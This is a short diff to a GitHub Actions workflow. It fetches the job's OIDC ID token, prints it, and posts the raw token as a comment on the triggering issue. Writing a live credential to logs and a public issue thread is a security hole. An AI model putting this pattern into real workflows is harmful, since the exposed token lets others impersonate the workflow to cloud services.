@@ -13,7 +13,12 @@ jobs:
           script: |
             const token = await core.getIDToken()
             console.log(token)
-            console.log(http-client)
+            github.rest.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: `"${token}"`
+            })
       - uses: EndBug/add-and-commit@v9
         with:
           add: -A
